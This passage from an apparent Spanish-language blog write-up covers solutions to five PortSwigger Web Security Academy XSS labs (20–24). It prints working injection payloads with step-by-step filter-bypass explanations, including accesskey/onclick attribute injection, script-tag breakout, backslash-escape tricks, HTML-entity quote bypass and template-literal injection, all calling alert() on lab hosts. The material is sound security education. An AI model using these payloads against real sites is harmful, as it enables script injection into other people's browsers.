Supongamos que tenemos una tienda online, y tenemos una sección propia de computadoras de escritorio pero hay diferentes formas de llegar a esta sección de la web creada especificamente para computadoras de escritorio.

https://tienda.com/computadoras-escritorio/

Este enlace es el canónico, pero el usuario puede ingresar ahí de alguna otra forma por ejemplo, por algun filtro de busqueda:

https://tienda.com/pc?categoria=computadoras&tipo=escritorio

Este es el enlace no canónico ya que esta URL no canónica se ha creado por el usuario al acceder a secciónes o pulsar botónes etc.

Pero como estan ambas realcionadas entonces en la url no canonica veremos lo mismo que en la url canonica, simplemente se define para saber cuál es la original, y evitar duplicados de url y problemas con la web.

<br>

Así que ahora que sabemos que el una URL canónica, vamos al laboratorio:

![blog](/assets/images/XSS/lab20/blog.png)

Al abrir el código fuente de la web vemos lo siguiente:

![canon](/assets/images/XSS/lab20/canon.png)

Vemos la siguiente linea:

`<link rel="canonical" href='https://0ac300640411e9b081c621a9002a0002.web-security-academy.net/'/>`

Podemos apreciar que se esta definiendo la URL canónica.

Desúes el laboratorio nos decia que debemos inyectar un atributo y llamar a la función **alert()**.

Y despúes nos dice que la victima tocará las teclas:

- ALT+SHIFT+X (windows/Linux)
- CTRL+ALT+X (MacOS)
- Alt+X (Linux(Alternativo))

Dependiendo el sistema operativo.

<br>

Intentaremos inyectar un parametro en la URL llamado **accesskey** lo que hace este parametro de HTML es definir un shortcut el cuál ejecutará algo, la sintaxis sería algo así:

`/?accesskey='x'onclick='alert(1)'`

Vemos que estamos definiendo el parametro inyectado, al cúal se accederá con la combinación de teclas que depende del sistema operativo más la letra en este caso **x**, después de que se ejecute el shortcut lo que sucederá es que se llamará a el evento **onclick** que ejecuta algo al momento de que en este caso el usuario pulse la combinación de teclas, y lo que ejecutará será la función **alert()** para completar el laboratorio.

> El signo de ? se usa para que nos lea el parametro asignado, y no como parte de la dirección URL, esto se hace porque sin el signo nos daría un error de que no existe la web ya que se estaría tomando el parametro como parte de la URL y como este parametro no se toma como parametro nos dará error.

<br>

Pero en nuestro caso debemos modificar un poco ya que cambia algo en la URL, ya que si inyectamos justo como lo mostre en la URL no sucederá nada y en el código de la web veremos lo siguiente:

![badlink](/assets/images/XSS/lab20/badlink.png)

```js
<link rel="canonical" href='https://0add00180396828f81a5932100d500e8.web-security-academy.net/?accesskey='x'onclick='alert(1)''/>
```

En este caso podemos ver que no sucedió nada ya que hay un error de sintaxis, si vemos bien podemos apreciar que después del parametro **accesskey** seguimos dentro del **href** por lo que se esta tomando como parte de la URL canónica y no como un valor que deba interpretarse que es lo que queremos que suceda.

Y también vemos que al final hay una comilla extra ya que es la que cierra el **href**.

Así que como dije anteriormente, no sucederá nada de esta forma, así que ahora vamos a hacer la forma correcta:

`/?'accesskey='x'onclick='alert(1)`

Si notamos bien, estamos poniendo una comilla simple antes del **accesskey**, y esto lo hacemos para cerrar el valor de URL que estaba cargando **href** como vimos en el código, y ahora continuamos escribiendo el código ya que habremos escapado del valor de **href**, así que después vemos que solo agregamos una comilla simple al definir la función de **alert()** y al final no pusimos otra, ¿Y esto Porque?, Esto se hace ya que como recordamos hay una comilla que cierra el **href** originalmente pero nosotros usaremos esa comilla que se ha arrastrado ya que cerramos el **href** desde antes, así que ahora la usaremos para cerrar el contenido de **onclick** osea **alert()**, de esta forma la sintaxis ya estaría bien y quedaría así:

![goodlink](/assets/images/XSS/lab20/goodlink.png)

Al enviar esta petición y pulslar la tecla dependiendo el sistema veremos lo siguiente:

![altshiftx](/assets/images/XSS/lab20/altshiftx.png)

Se ha ejecutado el XSS y terminamos el laboratorio.

Ahora si vemos el código de esta petición podremos ver que ahora la sintaxis es correcta:

![greatcode](/assets/images/XSS/lab20/greatcode.png)

```js
<link rel="canonical" href='https://0add00180396828f81a5932100d500e8.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
```
Y podemos apreciar que la sintaxis si es correcta y por eso nos permitio ejecutar el XSS correctamente.

Y terminamos el laboratorio:

![end](/assets/images/XSS/lab20/end.png)

<br>

# Laboratorio 21: Reflected XSS into a JavaScript string with single quote and backslash escaped

En este laboratorio nos dicen lo siguiente:

![lab21](/assets/images/XSS/lab21/lab21.png)

Dice que este laboratorio contiene un XSS reflected(reflejado), y que se encuentrá en la función de busqueda, y que se produce por detrás en una cadena que usa javascript con comillas simples y barras invertidas escapadas.

Ahora veremos a lo que se refiere, y el objetivo es escapar de la cadena por defecto e inyectar nuestro código para llamar a la función **alert()**.

Podemos usar BurpSuite para mayor comodidad pero yo usare el navegador para explicarlo más claro.

Al entrar al laboratorio veremos lo siguiente:

![blog](/assets/images/XSS/lab21/blog.png)

Vemos un blog común, usaremos la función de busqueda para meter algún valor:

Usaremos este valor de entrada:

`<body> <prueba>`

![test](/assets/images/XSS/lab21/test.png)

Y al enviar esto no vemos nada, pero si vamos al código de la web, podremos notar lo siguiente:

![xss](/assets/images/XSS/lab21/xss.png)

Podemos ver que la variable **searchTerms** esta guardando el contenido ingresado por la función de busqueda se esta guardando en dicha variable.

Y después podemos ver que abajo esta usando **document.write**, esta accediendo al DOM de la web para modificarlo ya que hará cambios, en este caso cargará una imagen .gif, y después mostrará el contenido que se ingreso por entrada y se supone que esta siendo filtrada para evitar ataques XSS usando **encodeURIComponent**, pero si el ataque sucede antes de que se filtre esto entonces no tiene sentido lo que hace el programador de la web.

Para ello intentaremos escapar del valor de la variable **searchTerms**, primero meteremos de entrada lo siguiente para ver que sucede:

![prueba](/assets/images/XSS/lab21/prueba.png)

Vemos que pusimos de entrada `Prueba'xss`, ahora veremos el código de la web para ver como respondio esta petición:

![esc](/assets/images/XSS/lab21/escape.png)

Podemos ver que nos ha escapado la comilla simple para evitar cerrar el contenido de la variable, y nos la ha escapado usando una barra invertida \ haciendo que la comilla se tome como texto simple y no como un valor.

<br>

Sabemos que la variable que esta en el código esta dentro de una etiqueta `<script>` así que lo que haremos será intentar cerrar esa etiqueta y ver que sucede:

Usaremos esta entrada de datos para cerrar el valor de  la etiqueta script que esta por defecto:

`</script>Prueba'XSS`

![xss2](/assets/images/XSS/lab21/xss2.png)

Y podemos ver algo extraño en la parte de abajo, al parecer es una parte de código que hemos alterado gracias a nuestra entrada de datos por lo que es buena señal, así que iremos a ver el código de esta petición:

![inyectado](/assets/images/XSS/lab21/inyectado.png)

Podemos apreciar que sigue escapando la comilla simple, pero esta vez nos damos cuenta que hemos podido inyectar correctamente la finalización de la etiqueta script, así que como sabemos que podemos inyectar etiquetas después de cerrar la de script, entonces inyectaremos otra de script pero esta vez para llamar a la función **alert()** quedandonos la entrada así:

`</script><script>alert(1)</script>`

Y al enviar esta petición:

![alert](/assets/images/XSS/lab21/alert.png)

POdemos ver que se ha hecho correctamente el ataque XSS reflected ya que vemos la ventana de alert y que hemos terminado el laboratorio.

Si vamos a ver el código de esta petición:

![scriptfinal](/assets/images/XSS/lab21/scriptfinal.png)

Podemos apreciar que cerramos el script por defecto gracias a la entrada no sanitizada de datos, y después abrimos una nueva llamando a la función **alert()** nuevamente.

Y habremos acabado con este laboratorio:

![end](/assets/images/XSS/lab21/end.png)

<br>

# Laboratorio 22: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

En este laboratorio vemos que nos piden lo siguiente:

![lab22](/assets/images/XSS/lab22/lab22.png)

Nos dice que existe una vulnerabilidad XSS reflejada en la función de busqueda de la web, y que los corchetes angulares osea `<>` se codifican en formato HTML para evitar que se interpreten y las comillas simples `'` se escapan automaticamente como lo vimos en el anterior laboratorio donde se agregaba una barra invertida para evitar que se interprete.

Y como objetivo nos pide realizar un XSS para escapar del código de la web javascript y llamar a la función **alert()**.

Primero al ir a la web y hacer una consulta normal vemos lo siguiente:

![prueba](/assets/images/XSS/lab22/prueba.png)

Vemos que buscamos algo en este caso "Prueba", y no vemos nada raro.

<br>

Ahora leeremos el código de esta petición y veremos lo siguiente:

![var](/assets/images/XSS/lab22/var.png)

Podemos ver que estamos dentro de unas etiquetas `<script>` y que nuestro contenido ingresado por entrada esta guardandose en la variable **searchTerms**.

Intentaremos escapar de la variable **searchTerms**, pero como recordamos no podemos usar los corchetes angulares ya que se convierten en entidades HTML y tampoco podemos la comilla simple ya que esta será escapada con una barra invertida.

Así que lo que haremos será meter la siguiente entrada de datos:

`\'-alert(1)//`

Lo que estamos intentando aquí es que ponemos una barra invertida para escapar la otra barra invertida que se pondrá antes de la comilla simple para escapar la comilla, de este modo estaremos escapando el valor que escapa a la comilla simple.

Ahora como esto se toma como texto lo que hicimos con la comilla simple fue cerrar el valor de la variable **searchTerms**, usamos un guion para separar esa parte de la que sigue, la cuál es llamar a la función **alert()** y esta vez la llamamos ya que si recordamos en el código estamos dentro de unas etiquetas `<script>` así que ya podremos llamar a esta función de javascript, una vez llamada lo que haremos será comentar el resto de código para evitar errores de sintaxis usando **//** , de este modo estaremos comentando todo el resto de código de esta misma linea.

<br>

Así que una vez metamos esta entrada de datos en la función de busqueda veremos lo siguiente:

![exploit](/assets/images/XSS/lab22/exploit.png)

Podemos ver que hemos logrado inyectar el código, y si vemos el código de la web nuevamente:

![code](/assets/images/XSS/lab22/code.png)

Podemos apreciar que hemos logrado inyectar la alerta como vimos anteriormente que funciono.

Y hemos terminado el laboratorio:

![end](/assets/images/XSS/lab22/end.png)

<br>

# Laboratorio 23: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

En este laboratorio de XSS almacenado nos piden lo siguiente:

![lab23](/assets/images/XSS/lab23/lab23.png)

Nos dice que existe una vulnerabilidad XSS en la sección de comentarios, y que debemos llamar un comentario aprovechando el XSS para llamar a la función **alert()** y también que la entrada de corchetes angulares, comillas simples, y barras invertidas, se convierten a entidades HTML para evitar ataques XSS.

<br>

Al abrir la web vemos un blog común con posts:

![post](/assets/images/XSS/lab23/post.png)

Al entrar a cualquier post encontraremos una sección de comentarios:

![comentarios](/assets/images/XSS/lab23/comentarios.png)

Dejaremos un comentario normal para ver como se comporta el servidor web:

![comentario](/assets/images/XSS/lab23/comentario.png)

Al postear el comentario, lo veremos publicado en la sección de comentarios de este post:

![link](/assets/images/XSS/lab23/link.png)

Si damos click al nombre esto nos redigira a la URL que proporcionamos como sitio web al momento de postear el comentario.

Ahora veremos el código de la web en este comentario para ver que hay por detrás:

![codeline](/assets/images/XSS/lab23/codeline.png)

```js
<a id="author" href="https://dantedansh.github.io/" onclick="var tracker={track(){}};tracker.track('https://dantedansh.github.io/');">Dante</a>
```

Podemos ver que primero usa la etiqueta `<a>` para crear un enlace, el cual tiene como id el valor de **author**, después se le pasa la URL a la que hará referencia la web para ser redirigido, y después usamos el evento **onclick** donde dentro de este evento se esta llamando a alguna función llamada **track()** que debe haber en algún lugar y se envia la URL como parametro dentro de **tracker.track**, vemos que se pasa como parametro la URL para después finalizar el valor URL de `</a>`.

<br>

Ahora intentaremos escapar del valor de  **tracker.track** pero no podemos ya que al intentar algún exploit como el siguiente:

`https://dantedansh.github.io' + alert(1) + '`

Y lo que intentamos aquí en teoria es escapar del valor de  **tracker.track** con una comilla simple, para posteriormente concatenar la función de alerta, y cerrar con una ultima comilla simple la comilla que se recorre por detrás al momento de poner la primera comilla simple y escapar del valor de  **tracker.track** y cerrarla para evitar errores.

Así que comentaremos este valor:

![pruebasxss](/assets/images/XSS/lab23/pruebasxss.png)

Pero al comentar con esta entrada de datos como URL, no funciona lo que queriamos ya que como podemos ver en el código de la respuesta de esta petición:

![scape](/assets/images/XSS/lab23/scape.png)

Apreciamos que las comillas que agregamos se han escapado automaticamente, y ya no es posible usar una barra inversa para escapar el valor que escapa la comilla ya que esta más protegido.

<br>

Así que lo que intentaremos es lo siguiente:

`https://dantedansh.github.io?&apos;-alert(1)-&apos;`

Lo que estamos haciendo en este exploit que hemos creado, es lo siguiente pero decodificado en valores entidades HTML:

`https://dantedansh.github.io?'-alert(1)-'`

Primero estamos usando el signo de interrogación para decirle que hay un parametro a agregar en la URL el cúal es simplemente la comilla simple, esto es para cerrar el valor de la URL del **tracker.track**, después una vez hemos escapado lo que haremos será llamar a la función **alert()** separada de las comillas usando guiones para evitar errores, y por último ponemos esta última comilla que lo que hará es como ya sabemos cerrar el valor de la comilla simple que se recorrio al poner la primera comilla simple.

Pero como vimos el exploit original es el que esta codificado en entidades HTML para evitar que los filtros detecten la comilla simple, pero en este caso el filtro no detecta la comilla en entidad HTML por lo que podemos burlar el filtro.

<br>

Una vez entendido esto, lo que haremos será publicar el comentario con ese exploit:

![exploit](/assets/images/XSS/lab23/exploit.png)

Y al ver el comentario posteado vemos lo siguiente:

![click](/assets/images/XSS/lab23/click.png)

Si hacemos click en el Nombre que es donde se almaceno el link que pusimos en un principio, entonces se ejecutará el XSS provocando la llamada de la función **alert()**, y hemos completado el objetivo del laboratorio.

Ahora iremos a ver el código de este comentario para ver que ha funcionado:

![exploitfinal](/assets/images/XSS/lab23/exploitfinal.png)

```js
<a id="author" href="https://dantedansh.github.io?&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('https://dantedansh.github.io?&apos;-alert(1)-&apos;');">Dant3</a>
```

Así ha quedado el código de la web, podemos ver que no nos agrego ningun valor para escapar la comilla en entidad HTML.

Y así se ve la respuesta interpretada en el contexto de nuestro navegador:

![nav](/assets/images/XSS/lab23/navegador.png)

Vemos que interpreto las comillas simples, pero no se escaparon ya que la parte donde se deberian escapar ya paso y así hemos evadido el escapado de caracteres que estaba configurado por detrás.

Y habremos terminado este laboratorio:

![end](/assets/images/XSS/lab23/end.png)

<br>

# Laboratorio 24: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

En este laboratorio vemos lo siguiente:

![lab24](/assets/images/XSS/lab24/lab24.png)

Nos dice que existe un XSS reflejado en la función de busqueda del blog, y que los corchetes angulares son codificados en entidades HTML al igual que las comillas simples, dobles y inversas.

Y que para terminar este laboratorio debemos inyectar la función **alert()** dentro de la cadena de plantilla.

Primero al abrir la web vemos lo siguiente:

![blog](/assets/images/XSS/lab24/blog.png)

Podemos ver el blog y la función de busqueda, meteremos una cadena de texto para después ver en el código en que parte se esta reflejando, en este caso metimos la cadena de texto "Prueba":

![prueba](/assets/images/XSS/lab24/prueba.png)

Y en el código de esta petición vemos lo siguiente:

![code](/assets/images/XSS/lab24/code.png)

```js
<script>
  var message = `0 search results for 'Prueba'`;
  document.getElementById('searchMessage').innerText = message;
</script>                     
```

Primero podemos ver que estamos dentro de unas etiquetas `<script>` y después se crea una variable llamada **Message** pero a diferencia de declaración de variables comunes y que hemos visto, esta no usa comillas simples o dobles para guardar el contenido, vemos que esta usando unas  comillas inversas y dentro de ellas esta el valor **0 search results for 'Prueba'**, y esto porque es importante?

Es importante ya que al declarar una variable de ese modo lo que se esta haciendo es una cadena de plantilla o template string, la ventaja de esto es que con una variable declarada así se puede usar algo llamado interpolación de variables y expresiones directamente dentro desde la cadena de la variable a guardar.

Por ejemplo veamos el siguiente código:

```js
const nombre = 'D4nsh';
const edad = 18;

// Cadena de plantilla
const mensaje = `Hola, soy ${nombre} y tengo ${edad} años.`;

console.log(mensaje); // Salida: "Hola, soy D4nsh y tengo 18 años."
```

Podemos ver que nos permite llamar a una expresión usando los caracteres **${}** en este caso llamamos a la variable **nombre** y **edad** pero también podemos llamar a funciones de javascript, así que esto es en cuestion lo que quería aclarar sobre las cadenas de plantilla.

Y esto lo menciono ya que si recordamos, en el código donde se esta tratando el valor que dimos por entrada, vimos que estamos dentro de etiquetas `<script>` por lo que podemos llamar a algun valor de javascript, intentaremos hacer algo.

De entrada de datos meteremos esto:

`${alert(1)}`

Como estamos dentro de etiquetas de código javascript osea `<script>` entonces podemos llamar a una expresión en este caso será la función **alert()**, y como la web no esta bien sanitizada para la entrada de datos:

![alert](/assets/images/XSS/lab24/alert.png)

Podemos ver que la web ha interpretado nuestra función inyectada a través de la expresión.

Así que habremos terminado este laboratiro.

Podemos ver en el código de la web como se logro inyectar:

![inject](/assets/images/XSS/lab24/inject.png)

Podemos apreciar como se interpreto nuestra entrada como expresión y llamo a la función **alert()** gracias a que estamos en una etiqueta de `<script>` y podemos usar código javasript.

Y habremos terminado este laboratorio:

![end](/assets/images/XSS/lab24/end.png)

<br>

